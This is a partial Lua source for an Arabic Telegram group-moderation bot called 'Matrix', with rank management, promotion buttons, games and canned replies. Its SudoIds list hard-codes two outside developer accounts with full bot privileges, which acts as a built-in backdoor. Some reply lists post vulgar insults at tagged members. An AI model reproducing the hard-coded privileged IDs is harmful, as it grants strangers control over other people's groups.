------------------------------------------------
-- This Source Was Developed By (ABS) @IIRIIRI.--
...
DevId = Config.DevId
SudoIds = {Config.SudoIds,218385683,2075590328}
...
keyboard = {}
keyboard.inline_keyboard = {{{text = '⌁ Matrix TeAM .',url="t.me/HATLLA"}}}
...
--     Source Matrix     --
local AbsRank = function(msg) if SudoId(msg.sender_user_id_) then MatrixTEAM  = "المطور" elseif SecondSudo(msg) then MatrixTEAM = "المطور" elseif SudoBot(msg) then MatrixTEAM = "المطور" elseif ManagerAll(msg) then MatrixTEAM = "المدير" elseif AdminAll(msg) then MatrixTEAM = "الادمن" elseif AbsConstructor(msg) then MatrixTEAM = "المالك" elseif BasicConstructor(msg) then MatrixTEAM = "المنشئ" elseif Constructor(msg) then MatrixTEAM = "المنشئ" elseif Manager(msg) then MatrixTEAM = "المدير" elseif Admin(msg) then MatrixTEAM = "الادمن" else MatrixTEAM = "العضو" end return MatrixTEAM end
function IdRank(user_id,chat_id) if tonumber(user_id) == tonumber(2075590328) then MatrixTEAM = 'مطور السورس' elseif tonumber(user_id) == tonumber(Matrix) then MatrixTEAM = 'البوت' elseif SudoId(user_id) then MatrixTEAM = 'المطور الاساسي' elseif DevAbs:sismember(Matrix..'Abs:SecondSudo:', user_id) then MatrixTEAM = 'المطور الثانوي' elseif DevAbs:sismember(Matrix..'Abs:SudoBot:', user_id) then MatrixTEAM = DevAbs:get(Matrix.."Abs:SudoBot:Rd"..chat_id) or 'المطور' elseif DevAbs:sismember(Matrix..'Abs:ManagerAll:', user_id) then MatrixTEAM = DevAbs:get(Matrix.."Abs:Managers:Rd"..chat_id) or 'المدير العام' elseif DevAbs:sismember(Matrix..'Abs:AdminAll:', user_id) then MatrixTEAM = DevAbs:get(Matrix.."Abs:Admins:Rd"..chat_id) or 'الادمن العام' elseif DevAbs:sismember(Matrix..'Abs:VipAll:', user_id) then MatrixTEAM = DevAbs:get(Matrix.."Abs:VipMem:Rd"..chat_id) or 'المميز العام' elseif DevAbs:sismember(Matrix..'Abs:AbsConstructor:'..chat_id, user_id) then MatrixTEAM = 'المالك' elseif DevAbs:sismember(Matrix..'Abs:BasicConstructor:'..chat_id, user_id) then MatrixTEAM = DevAbs:get(Matrix.."Abs:BasicConstructor:Rd"..chat_id) or 'المنشئ الاساسي' elseif DevAbs:sismember(Matrix..'Abs:Constructor:'..chat_id, user_id) then MatrixTEAM = DevAbs:get(Matrix.."Abs:Constructor:Rd"..chat_id) or 'المنشئ' elseif DevAbs:sismember(Matrix..'Abs:Managers:'..chat_id, user_id) then MatrixTEAM = DevAbs:get(Matrix.."Abs:Managers:Rd"..chat_id) or 'المدير' elseif DevAbs:sismember(Matrix..'Abs:Admins:'..chat_id, user_id) then MatrixTEAM = DevAbs:get(Matrix.."Abs:Admins:Rd"..chat_id) or 'الادمن' elseif DevAbs:sismember(Matrix..'Abs:VipMem:'..chat_id, user_id) then  MatrixTEAM = DevAbs:get(Matrix.."Abs:VipMem:Rd"..chat_id) or 'المميز' elseif DevAbs:sismember(Matrix..'Abs:Cleaner:'..chat_id, user_id) then  MatrixTEAM = DevAbs:get(Matrix.."Abs:Cleaner:Rd"..chat_id) or 'المنظف' else MatrixTEAM = DevAbs:get(Matrix.."Abs:mem:Rd"..chat_id) or 'العضو' end return MatrixTEAM end
--     Source Matrix     --
...
keyboard = {} 
if Sudo(data) then
keyboard.inline_keyboard = {{{text="تنزيل مميز",callback_data=data.sender_user_id_..":RemMem:"..AbsId},{text="تنزيل ادمن",callback_data=data.sender_user_id_..":RemAdmin:"..AbsId}},{{text="تنزيل منشئ",callback_data=data.sender_user_id_..":RemConstructor:"..AbsId},{text="تنزيل مدير",callback_data=data.sender_user_id_..":RemManager:"..AbsId}},{{text="تنزيل منظف",callback_data=data.sender_user_id_..":RemCleaner:"..AbsId},{text="تنزيل منشئ اساسي",callback_data=data.sender_user_id_..":RemBasicConstructor:"..AbsId}},{{text="تنزيل مالك",callback_data=data.sender_user_id_..":RemAbsConstructor:"..AbsId},{text="تنزيل مطور",callback_data=data.sender_user_id_..":RemSudoBot:"..AbsId}},{{text="تنزيل مطور ثانوي",callback_data=data.sender_user_id_..":RemSecondSudo:"..AbsId}},{{text = '⌁ Matrix TeAM .',url="t.me/HATLLA"}}}
elseif SecondSudo(data) then
keyboard.inline_keyboard = {{{text="تنزيل مميز",callback_data=data.sender_user_id_..":RemMem:"..AbsId},{text="تنزيل ادمن",callback_data=data.sender_user_id_..":RemAdmin:"..AbsId}},{{text="تنزيل منشئ",callback_data=data.sender_user_id_..":RemConstructor:"..AbsId},{text="تنزيل مدير",callback_data=data.sender_user_id_..":RemManager:"..AbsId}},{{text="تنزيل منظف",callback_data=data.sender_user_id_..":RemCleaner:"..AbsId},{text="تنزيل منشئ اساسي",callback_data=data.sender_user_id_..":RemBasicConstructor:"..AbsId}},{{text="تنزيل مالك",callback_data=data.sender_user_id_..":RemAbsConstructor:"..AbsId},{text="تنزيل مطور",callback_data=data.sender_user_id_..":RemSudoBot:"..AbsId}},{{text = '⌁ Matrix TeAM .',url="t.me/HATLLA"}}}
elseif SudoBot(data) then
keyboard.inline_keyboard = {{{text="تنزيل مميز",callback_data=data.sender_user_id_..":RemMem:"..AbsId},{text="تنزيل ادمن",callback_data=data.sender_user_id_..":RemAdmin:"..AbsId}},{{text="تنزيل منشئ",callback_data=data.sender_user_id_..":RemConstructor:"..AbsId},{text="تنزيل مدير",callback_data=data.sender_user_id_..":RemManager:"..AbsId}},{{text="تنزيل منظف",callback_data=data.sender_user_id_..":RemCleaner:"..AbsId},{text="تنزيل منشئ اساسي",callback_data=data.sender_user_id_..":RemBasicConstructor:"..AbsId}},{{text="تنزيل مالك",callback_data=data.sender_user_id_..":RemAbsConstructor:"..AbsId}},{{text = '⌁ Matrix TeAM .',url="t.me/HATLLA"}}}
elseif AbsConstructor(data) then
keyboard.inline_keyboard = {{{text="تنزيل مميز",callback_data=data.sender_user_id_..":RemMem:"..AbsId},{text="تنزيل ادمن",callback_data=data.sender_user_id_..":RemAdmin:"..AbsId}},{{text="تنزيل منشئ",callback_data=data.sender_user_id_..":RemConstructor:"..AbsId},{text="تنزيل مدير",callback_data=data.sender_user_id_..":RemManager:"..AbsId}},{{text="تنزيل منظف",callback_data=data.sender_user_id_..":RemCleaner:"..AbsId},{text="تنزيل منشئ اساسي",callback_data=data.sender_user_id_..":RemBasicConstructor:"..AbsId}},{{text = '⌁ Matrix TeAM .',url="t.me/HATLLA"}}}
elseif BasicConstructor(data) then
keyboard.inline_keyboard = {{{text="تنزيل مميز",callback_data=data.sender_user_id_..":RemMem:"..AbsId},{text="تنزيل ادمن",callback_data=data.sender_user_id_..":RemAdmin:"..AbsId}},{{text="تنزيل منشئ",callback_data=data.sender_user_id_..":RemConstructor:"..AbsId},{text="تنزيل مدير",callback_data=data.sender_user_id_..":RemManager:"..AbsId}},{{text="تنزيل منظف",callback_data=data.sender_user_id_..":RemCleaner:"..AbsId}},{{text = '⌁ Matrix TeAM .',url="t.me/HATLLA"}}}
elseif Constructor(data) then
keyboard.inline_keyboard = {{{text="تنزيل مميز",callback_data=data.sender_user_id_..":RemMem:"..AbsId},{text="تنزيل ادمن",callback_data=data.sender_user_id_..":RemAdmin:"..AbsId}},{{text="تنزيل منظف",callback_data=data.sender_user_id_..":RemCleaner:"..AbsId},{text="تنزيل مدير",callback_data=data.sender_user_id_..":RemManager:"..AbsId}},{{text = '⌁ Matrix TeAM .',url="t.me/HATLLA"}}}
elseif Manager(data) then
keyboard.inline_keyboard = {{{text="تنزيل مميز",callback_data=data.sender_user_id_..":RemMem:"..AbsId},{text="تنزيل ادمن",callback_data=data.sender_user_id_..":RemAdmin:"..AbsId}},{{text = '⌁ Matrix TeAM .',url="t.me/HATLLA"}}}
elseif Admin(data) then
keyboard.inline_keyboard = {{{text="تنزيل مميز",callback_data=data.sender_user_id_..":RemMem:"..AbsId}},{{text = '⌁ Matrix TeAM .',url="t.me/HATLLA"}}}
end 
https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end,nil)
end
...
local MatrixTEAM = '⌔︙اهلا عزيزي ↫ '..AbsRank(msg)..' \n⌔︙تم تفعيل التواصل بنجاح'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, MatrixTEAM, 14, string.len(msg.sender_user_id_))
...
local MatrixTEAM =  DevAbs:smembers(Matrix..'Abs:Text:GpTexts'..text..msg.chat_id_)
Dev_Abs(msg.chat_id_, msg.id_, 1, '['..MatrixTEAM[math.random(#MatrixTEAM)]..']' , 1, 'md')  
end
end
--     Source Matrix     --
...
function MatrixTEAM(extra,result,success)
...
getUser(msg.sender_user_id_, MatrixTEAM)
end
end
--     Source Matrix     --
text = msg.content_.text_
...
if DevAbs:get('MatrixTEAM:'..Matrix.."numadd:user"..msg.chat_id_.."" .. msg.sender_user_id_) then 
if text and text:match("^الغاء$") then 
DevAbs:del('MatrixTEAM:'..Matrix..'id:user'..msg.chat_id_)  
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌔︙تم الغاء الامر', 1, 'md')
DevAbs:del('MatrixTEAM:'..Matrix.."numadd:user"..msg.chat_id_.."" .. msg.sender_user_id_)  
return false  end 
DevAbs:del('MatrixTEAM:'..Matrix.."numadd:user"..msg.chat_id_.."" .. msg.sender_user_id_)  
local numadded = string.match(text, "(%d+)") 
local iduserr = DevAbs:get('MatrixTEAM:'..Matrix..'id:user'..msg.chat_id_)  
...
if text and Constructor(msg) then 
if DevAbs:get('MatrixTEAM:'..Matrix.."nmadd:user"..msg.chat_id_.."" .. msg.sender_user_id_) then 
if text and text:match("^الغاء$") then 
DevAbs:del('MatrixTEAM:'..Matrix..'ids:user'..msg.chat_id_)  
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌔︙تم الغاء الامر', 1, 'md')
DevAbs:del('MatrixTEAM:'..Matrix.."nmadd:user"..msg.chat_id_.."" .. msg.sender_user_id_)  
return false  end 
DevAbs:del('MatrixTEAM:'..Matrix.."nmadd:user"..msg.chat_id_.."" .. msg.sender_user_id_)  
local numadded = string.match(text, "(%d+)") 
local iduserr = DevAbs:get('MatrixTEAM:'..Matrix..'ids:user'..msg.chat_id_)  
...
NameBot = (DevAbs:get(Matrix..'Abs:NameBot') or 'ماتركس')
local MatrixTEAM = {"لتكول بوت اسمي "..NameBot.." 😒🔪","اسمي القميل "..NameBot.." 😚♥️","عندي اسم تره 😒💔","صيحولي "..NameBot.." كافي بوت 😒🔪","انت البوت لك 😒💔"} 
Dev_Abs(msg.chat_id_, msg.id_, 1, MatrixTEAM[math.random(#MatrixTEAM)] , 1, 'html') 
return false
end
if text == 'اسم البوت' or text == 'البوت شنو اسمه' or text == 'شسمه البوت' or text == 'البوت شسمه' then
NameBot = (DevAbs:get(Matrix..'Abs:NameBot') or 'ماتركس') 
local MatrixTEAM = {"اسمي القميل "..NameBot.." 😚♥️","هلاا يروحيي وياكك "..NameBot.." 😻♥️"} 
Dev_Abs(msg.chat_id_, msg.id_, 1, MatrixTEAM[math.random(#MatrixTEAM)] , 1, 'html') 
return false
end
if text and text == (DevAbs:get(Matrix..'Abs:NameBot') or 'ماتركس') then 
NameBot = (DevAbs:get(Matrix..'Abs:NameBot') or 'ماتركس')
local MatrixTEAM = {'😸♥️ هلا كلبي وياك '..NameBot..' تفضل','ترةه مصختهاا احجيي شرايد 😕😒💔','اطلقق واحدد يصيح '..NameBot..' 😻♥️','خبصتت امنةة شتريدد عااد 🤧😒💔'} 
Dev_Abs(msg.chat_id_, msg.id_, 1, MatrixTEAM[math.random(#MatrixTEAM)] , 1, 'html') 
return false 
end
...
name = string.gsub(name,'🎚','🎚')
name = string.gsub(name,'☎️','☎️')
MatrixTEAM = '⌔︙اول واحد يدز هذا السمايل يربح ↫ '..name
...
MatrixTEAM = '⌔︙مبروك لقد ربحت في اللعبه \n⌔︙ارسل ↫ سمايلات للعب مره اخرى'
Dev_Abs(msg.chat_id_, msg.id_, 1,MatrixTEAM, 1, 'md')
...
MatrixTEAM = '⌔︙اول واحد يرتبها يربح ↫ '..name
Dev_Abs(msg.chat_id_, msg.id_, 1,MatrixTEAM, 1, 'md')
return false
end end
if text == DevAbs:get(Matrix..'Abs:GameNum'..msg.chat_id_) and not DevAbs:get(Matrix..'Abs:Games:Ids'..msg.chat_id_) then
...
MatrixTEAM = '⌔︙اول واحد يحلها يربح ↫ '..name
Dev_Abs(msg.chat_id_, msg.id_, 1,MatrixTEAM, 1, 'md')
return false
end end
if text == DevAbs:get(Matrix..'Abs:GameNum'..msg.chat_id_) and not DevAbs:get(Matrix..'Abs:Games:Ids'..msg.chat_id_) then
...
MatrixTEAM = '⌔︙ما معنى هذا السمايل :؟ ↫ '..name
Dev_Abs(msg.chat_id_, msg.id_, 1,MatrixTEAM, 1, 'md')
return false
end end
...
MatrixTEAM = '⌔︙ما هو عكس كلمة ↫ '..name
Dev_Abs(msg.chat_id_, msg.id_, 1,MatrixTEAM, 1, 'md')
return false
end end
...
name = string.gsub(name,'👩‍⚖️','👨‍⚖️👨‍⚖️👨‍⚖️👨‍⚖️👨‍⚖️👩‍⚖️👨‍⚖️👨‍⚖️')
name = string.gsub(name,'👨‍🎨','👩‍🎨👩‍🎨👨‍🎨👩‍🎨👩‍🎨👩‍🎨👩‍🎨👩‍🎨')
MatrixTEAM = '⌔︙اول واحد يطلع المختلف يربح\n{'..name..'} '
Dev_Abs(msg.chat_id_, msg.id_, 1,MatrixTEAM, 1, 'md')
return false
end end
...
MatrixTEAM = '⌔︙اكمل المثال التالي ↫ ['..name..']'
Dev_Abs(msg.chat_id_, msg.id_, 1,MatrixTEAM, 1, 'md')
return false
end end
...
MatrixTEAM = '⌔︙اكمل المعادله التاليه ↫ ⤈\n{'..name..'} '
Dev_Abs(msg.chat_id_, msg.id_, 1,MatrixTEAM, 1, 'md')
return false
end end
...
{{text = '⌁ Matrix TeAM .',url="t.me/HATLLA"}},
}
...
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),MatrixTEAM)
end
end
--     Source Matrix     --
...
⌔︙[Developer](https://t.me/IIRIIRI)
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌔︙[Tws Matrix](https://t.me/XXTTAXbot)
]]
...
Text = "• *The developer and programmer of this source is* : [مطور السورس](https://t.me/IIRIIRI)."
keyboard = {} 
keyboard.inline_keyboard = {{{text='- مطور السورس .',url="t.me/IIRIIRI"}}}
local msg_id = msg.id_/2097152/0.5
...
local MatrixTEAM = "صارر ستاذيي 🏃🏻‍♂️♥️" 
Dev_Abs(msg.chat_id_, msg.id_, 1,MatrixTEAM, 1, 'md') 
local MatrixTEAM = { "لكك جرجف @"..username.." احترم اسيادكك لا اكتلكك وازربب على كبركك،💩🖐🏿","هشش لكك فاشل @"..username.." لتضل تمسلت لا اخربط تضاريس وجهك جنه ابط عبده، 😖👌🏿","حبيبي @"..username.." راح احاول احترمكك هالمره بلكي تبطل حيونه، 🤔🔪","دمشي لك @"..username.." ينبوع الفشل مو زين ملفيك ونحجي وياك هي منبوذ 😏🖕🏿","ها الغليض التفس ابو راس المربع @"..username.." متعلملك جم حجايه وجاي تطكطكهن علينه دبطل😒🔪",}
Dev_Abs(msg.chat_id_, result.id_, 1,''..MatrixTEAM[math.random(#MatrixTEAM)], 1, 'html') 
else  
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌔︙العضو غير موجود في المجموعه', 1, 'md') 
end 
end 
resolve_username(username,MatrixTEAM)
end
end
--     Source Matrix     --
...
local MatrixTEAM = "صارر ستاذيي 🏃🏻‍♂️♥️" 
Dev_Abs(msg.chat_id_, msg.id_, 1,MatrixTEAM, 1, 'md') 
local MatrixTEAM = {"لكك جرجف احترم اسيادكك لا اكتلكك وازربب على كبركك،💩🖐🏿","هشش فاشل لتضل تمسلت لا اخربط تضاريس وجهك جنه ابط عبده، 😖👌🏿","دمشي لك ينبوع الفشل مو زين ملفيك ونحجي وياك هي منبوذ 😏🖕🏿","ها الغليض التفس ابو راس المربع متعلملك جم حجايه وجاي تطكطكهن علينه دبطل😒🔪","حبيبي راح احاول احترمكك هالمره بلكي تبطل حيونه، 🤔🔪"} 
Dev_Abs(msg.chat_id_, result.id_, 1,''..MatrixTEAM[math.random(#MatrixTEAM)], 1, 'md') 
end 
...
local MatrixTEAM = "صارر ستاذيي 🏃🏻‍♂️♥️" 
Dev_Abs(msg.chat_id_, msg.id_, 1,MatrixTEAM, 1, 'md') 
local MatrixTEAM = {"مواححح افيش عافيههه😍🔥💗","امممووااهحح شهلعسل🥺🍯💘","مواححح،ءوفف اذوب🤤💗"} 
Dev_Abs(msg.chat_id_, result.id_, 1,''..MatrixTEAM[math.random(#MatrixTEAM)], 1, 'md') 
end 
if tonumber(msg.reply_to_message_id_) == 0 then
else 
...
local MatrixTEAM = "صارر ستاذيي 🏃🏻‍♂️♥️" 
Dev_Abs(msg.chat_id_, msg.id_, 1,MatrixTEAM, 1, 'md') 
local MatrixTEAM = {"تتعال ححب محتاجيك🙂🍭","تعال يولل استاذكك ايريدككك😒🔪","يمعوود تعاال يريدوكك🤕♥️","تعال لكك ديصيحوك😐🖤"} 
Dev_Abs(msg.chat_id_, result.id_, 1,''..MatrixTEAM[math.random(#MatrixTEAM)], 1, 'md') 
end 
if tonumber(msg.reply_to_message_id_) == 0 then
else 
...
local MatrixTEAM = "صارر ستاذيي 🏃🏻‍♂️♥️" 
Dev_Abs(msg.chat_id_, msg.id_, 1,MatrixTEAM, 1, 'md') 
local MatrixTEAM = { "تتعال ححب @"..username.." محتاجيك🙂🍭","تعال يولل @"..username.." استاذكك ايريدككك😒🔪","يمعوود @"..username.." تعاال يريدوكك🤕♥️","تعال لكك @"..username.." ديصيحوك😐🖤",}
Dev_Abs(msg.chat_id_, result.id_, 1,''..MatrixTEAM[math.random(#MatrixTEAM)], 1, 'html') 
else  
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌔︙العضو غير موجود في المجموعه', 1, 'md') 
end 
...
local Text = '⌔︙قم باستعمال الازرار لرفع العضو ↫ ⤈\n⌔︙العضو ↫ ['..dp.first_name_..'](t.me/'..(dp.username_ or 'HATLLA')..')'
if Sudo(msg) then
inline = {{{text="رفع مميز",callback_data=msg.sender_user_id_..":SetMem:"..result.sender_user_id_},{text="رفع ادمن",callback_data=msg.sender_user_id_..":SetAdmin:"..result.sender_user_id_}},{{text="رفع منشئ",callback_data=msg.sender_user_id_..":SetConstructor:"..result.sender_user_id_},{text="رفع مدير",callback_data=msg.sender_user_id_..":SetManager:"..result.sender_user_id_}},{{text="رفع منظف",callback_data=msg.sender_user_id_..":SetCleaner:"..result.sender_user_id_},{text="رفع منشئ اساسي",callback_data=msg.sender_user_id_..":SetBasicConstructor:"..result.sender_user_id_}},{{text="رفع مالك",callback_data=msg.sender_user_id_..":SetAbsConstructor:"..result.sender_user_id_},{text="رفع مطور",callback_data=msg.sender_user_id_..":SetSudoBot:"..result.sender_user_id_}},{{text="رفع مطور ثانوي",callback_data=msg.sender_user_id_..":SetSecondSudo:"..result.sender_user_id_}},{{text = '⌁ Matrix TeAM .',url="t.me/HATLLA"}}}
elseif SecondSudo(msg) then
inline = {{{text="رفع مميز",callback_data=msg.sender_user_id_..":SetMem:"..result.sender_user_id_},{text="رفع ادمن",callback_data=msg.sender_user_id_..":SetAdmin:"..result.sender_user_id_}},{{text="رفع منشئ",callback_data=msg.sender_user_id_..":SetConstructor:"..result.sender_user_id_},{text="رفع مدير",callback_data=msg.sender_user_id_..":SetManager:"..result.sender_user_id_}},{{text="رفع منظف",callback_data=msg.sender_user_id_..":SetCleaner:"..result.sender_user_id_},{text="رفع منشئ اساسي",callback_data=msg.sender_user_id_..":SetBasicConstructor:"..result.sender_user_id_}},{{text="رفع مالك",callback_data=msg.sender_user_id_..":SetAbsConstructor:"..result.sender_user_id_},{text="رفع مطور",callback_data=msg.sender_user_id_..":SetSudoBot:"..result.sender_user_id_}},{{text = '⌁ Matrix TeAM .',url="t.me/HATLLA"}}}
elseif SudoBot(msg) then
inline = {{{text="رفع مميز",callback_data=msg.sender_user_id_..":SetMem:"..result.sender_user_id_},{text="رفع ادمن",callback_data=msg.sender_user_id_..":SetAdmin:"..result.sender_user_id_}},{{text="رفع منشئ",callback_data=msg.sender_user_id_..":SetConstructor:"..result.sender_user_id_},{text="رفع مدير",callback_data=msg.sender_user_id_..":SetManager:"..result.sender_user_id_}},{{text="رفع منظف",callback_data=msg.sender_user_id_..":SetCleaner:"..result.sender_user_id_},{text="رفع منشئ اساسي",callback_data=msg.sender_user_id_..":SetBasicConstructor:"..result.sender_user_id_}},{{text="رفع مالك",callback_data=msg.sender_user_id_..":SetAbsConstructor:"..result.sender_user_id_}},{{text = '⌁ Matrix TeAM .',url="t.me/HATLLA"}}}
elseif AbsConstructor(msg) then
inline = {{{text="رفع مميز",callback_data=msg.sender_user_id_..":SetMem:"..result.sender_user_id_},{text="رفع ادمن",callback_data=msg.sender_user_id_..":SetAdmin:"..result.sender_user_id_}},{{text="رفع منشئ",callback_data=msg.sender_user_id_..":SetConstructor:"..result.sender_user_id_},{text="رفع مدير",callback_data=msg.sender_user_id_..":SetManager:"..result.sender_user_id_}},{{text="رفع منظف",callback_data=msg.sender_user_id_..":SetCleaner:"..result.sender_user_id_},{text="رفع منشئ اساسي",callback_data=msg.sender_user_id_..":SetBasicConstructor:"..result.sender_user_id_}},{{text = '⌁ Matrix TeAM .',url="t.me/HATLLA"}}}
elseif BasicConstructor(msg) then
inline = {{{text="رفع مميز",callback_data=msg.sender_user_id_..":SetMem:"..result.sender_user_id_},{text="رفع ادمن",callback_data=msg.sender_user_id_..":SetAdmin:"..result.sender_user_id_}},{{text="رفع منشئ",callback_data=msg.sender_user_id_..":SetConstructor:"..result.sender_user_id_},{text="رفع مدير",callback_data=msg.sender_user_id_..":SetManager:"..result.sender_user_id_}},{{text="رفع منظف",callback_data=msg.sender_user_id_..":SetCleaner:"..result.sender_user_id_}},{{text = '⌁ Matrix TeAM .',url="t.me/HATLLA"}}}
elseif Constructor(msg) then
inline = {{{text="رفع مميز",callback_data=msg.sender_user_id_..":SetMem:"..result.sender_user_id_},{text="رفع ادمن",callback_data=msg.sender_user_id_..":SetAdmin:"..result.sender_user_id_}},{{text="رفع منظف",callback_data=msg.sender_user_id_..":SetCleaner:"..result.sender_user_id_},{text="رفع مدير",callback_data=msg.sender_user_id_..":SetManager:"..result.sender_user_id_}},{{text = '⌁ Matrix TeAM .',url="t.me/HATLLA"}}}
elseif Manager(msg) then
inline = {{{text="رفع مميز",callback_data=msg.sender_user_id_..":SetMem:"..result.sender_user_id_},{text="رفع ادمن",callback_data=msg.sender_user_id_..":SetAdmin:"..result.sender_user_id_}},{{text = '⌁ Matrix TeAM .',url="t.me/HATLLA"}}}
elseif Admin(msg) then
inline = {{{text="رفع مميز",callback_data=msg.sender_user_id_..":SetMem:"..result.sender_user_id_}},{{text = '⌁ Matrix TeAM .',url="t.me/HATLLA"}}}
end
...
local Text = '⌔︙قم باستعمال الازرار لتنزيل العضو ↫ ⤈\n⌔︙العضو ↫ ['..dp.first_name_..'](t.me/'..(dp.username_ or 'HATLLA')..')'
if Sudo(msg) then
inline = {{{text="تنزيل مميز",callback_data=msg.sender_user_id_..":RemMem:"..result.sender_user_id_},{text="تنزيل ادمن",callback_data=msg.sender_user_id_..":RemAdmin:"..result.sender_user_id_}},{{text="تنزيل منشئ",callback_data=msg.sender_user_id_..":RemConstructor:"..result.sender_user_id_},{text="تنزيل مدير",callback_data=msg.sender_user_id_..":RemManager:"..result.sender_user_id_}},{{text="تنزيل منظف",callback_data=msg.sender_user_id_..":RemCleaner:"..result.sender_user_id_},{text="تنزيل منشئ اساسي",callback_data=msg.sender_user_id_..":RemBasicConstructor:"..result.sender_user_id_}},{{text="تنزيل مالك",callback_data=msg.sender_user_id_..":RemAbsConstructor:"..result.sender_user_id_},{text="تنزيل مطور",callback_data=msg.sender_user_id_..":RemSudoBot:"..result.sender_user_id_}},{{text="تنزيل مطور ثانوي",callback_data=msg.sender_user_id_..":RemSecondSudo:"..result.sender_user_id_}},{{text = '⌁ Matrix TeAM .',url="t.me/HATLLA"}}}
elseif SecondSudo(msg) then
inline = {{{text="تنزيل مميز",callback_data=msg.sender_user_id_..":RemMem:"..result.sender_user_id_},{text="تنزيل ادمن",callback_data=msg.sender_user_id_..":RemAdmin:"..result.sender_user_id_}},{{text="تنزيل منشئ",callback_data=msg.sender_user_id_..":RemConstructor:"..result.sender_user_id_},{text="تنزيل مدير",callback_data=msg.sender_user_id_..":RemManager:"..result.sender_user_id_}},{{text="تنزيل منظف",callback_data=msg.sender_user_id_..":RemCleaner:"..result.sender_user_id_},{text="تنزيل منشئ اساسي",callback_data=msg.sender_user_id_..":RemBasicConstructor:"..result.sender_user_id_}},{{text="تنزيل مالك",callback_data=msg.sender_user_id_..":RemAbsConstructor:"..result.sender_user_id_},{text="تنزيل مطور",callback_data=msg.sender_user_id_..":RemSudoBot:"..result.sender_user_id_}},{{text = '⌁ Matrix TeAM .',url="t.me/HATLLA"}}}
elseif SudoBot(msg) then
inline = {{{text="تنزيل مميز",callback_data=msg.sender_user_id_..":RemMem:"..result.sender_user_id_},{text="تنزيل ادمن",callback_data=msg.sender_user_id_..":RemAdmin:"..result.sender_user_id_}},{{text="تنزيل منشئ",callback_data=msg.sender_user_id_..":RemConstructor:"..result.sender_user_id_},{text="تنزيل مدير",callback_data=msg.sender_user_id_..":RemManager:"..result.sender_user_id_}},{{text="تنزيل منظف",callback_data=msg.sender_user_id_..":RemCleaner:"..result.sender_user_id_},{text="تنزيل منشئ اساسي",callback_data=msg.sender_user_id_..":RemBasicConstructor:"..result.sender_user_id_}},{{text="تنزيل مالك",callback_data=msg.sender_user_id_..":RemAbsConstructor:"..result.sender_user_id_}},{{text = '⌁ Matrix TeAM .',url="t.me/HATLLA"}}}
elseif AbsConstructor(msg) then
inline = {{{text="تنزيل مميز",callback_data=msg.sender_user_id_..":RemMem:"..result.sender_user_id_},{text="تنزيل ادمن",callback_data=msg.sender_user_id_..":RemAdmin:"..result.sender_user_id_}},{{text="تنزيل منشئ",callback_data=msg.sender_user_id_..":RemConstructor:"..result.sender_user_id_},{text="تنزيل مدير",callback_data=msg.sender_user_id_..":RemManager:"..result.sender_user_id_}},{{text="تنزيل منظف",callback_data=msg.sender_user_id_..":RemCleaner:"..result.sender_user_id_},{text="تنزيل منشئ اساسي",callback_data=msg.sender_user_id_..":RemBasicConstructor:"..result.sender_user_id_}},{{text = '⌁ Matrix TeAM .',url="t.me/HATLLA"}}}
elseif BasicConstructor(msg) then
inline = {{{text="تنزيل مميز",callback_data=msg.sender_user_id_..":RemMem:"..result.sender_user_id_},{text="تنزيل ادمن",callback_data=msg.sender_user_id_..":RemAdmin:"..result.sender_user_id_}},{{text="تنزيل منشئ",callback_data=msg.sender_user_id_..":RemConstructor:"..result.sender_user_id_},{text="تنزيل مدير",callback_data=msg.sender_user_id_..":RemManager:"..result.sender_user_id_}},{{text="تنزيل منظف",callback_data=msg.sender_user_id_..":RemCleaner:"..result.sender_user_id_}},{{text = '⌁ Matrix TeAM .',url="t.me/HATLLA"}}}
elseif Constructor(msg) then
inline = {{{text="تنزيل مميز",callback_data=msg.sender_user_id_..":RemMem:"..result.sender_user_id_},{text="تنزيل ادمن",callback_data=msg.sender_user_id_..":RemAdmin:"..result.sender_user_id_}},{{text="تنزيل منظف",callback_data=msg.sender_user_id_..":RemCleaner:"..result.sender_user_id_},{text="تنزيل مدير",callback_data=msg.sender_user_id_..":RemManager:"..result.sender_user_id_}},{{text = '⌁ Matrix TeAM .',url="t.me/HATLLA"}}}
elseif Manager(msg) then
inline = {{{text="تنزيل مميز",callback_data=msg.sender_user_id_..":RemMem:"..result.sender_user_id_},{text="تنزيل ادمن",callback_data=msg.sender_user_id_..":RemAdmin:"..result.sender_user_id_}},{{text = '⌁ Matrix TeAM .',url="t.me/HATLLA"}}}
elseif Admin(msg) then
inline = {{{text="تنزيل مميز",callback_data=msg.sender_user_id_..":RemMem:"..result.sender_user_id_}},{{text = '⌁ Matrix TeAM .',url="t.me/HATLLA"}}}
end
SendInline(msg.chat_id_,Text,nil,inline,msg.id_/2097152/0.5)
end,nil)
end 
...
if text == "راسلني" then
MatrixTEAM = {"ها هلاو","انطق","كول حبي","تفضل"};
send(msg.sender_user_id_, 0,MatrixTEAM[math.random(#MatrixTEAM)])
end
--     Source Matrix     --
...
DevAbs:set('MatrixTEAM:'..Matrix..'id:user'..msg.chat_id_,TXT)  
DevAbs:setex('MatrixTEAM:'..Matrix.."numadd:user"..msg.chat_id_.."" .. msg.sender_user_id_, 300, true)  
...
DevAbs:set('MatrixTEAM:'..Matrix..'ids:user'..msg.chat_id_,TXT)  
DevAbs:setex('MatrixTEAM:'..Matrix.."nmadd:user"..msg.chat_id_.."" .. msg.sender_user_id_, 300, true)  
...
DevAbs:set("Matrix:New:id:"..Matrix..msg.sender_user_id_,'MatrixTEAM')
return "MatrixTEAM"
end
...
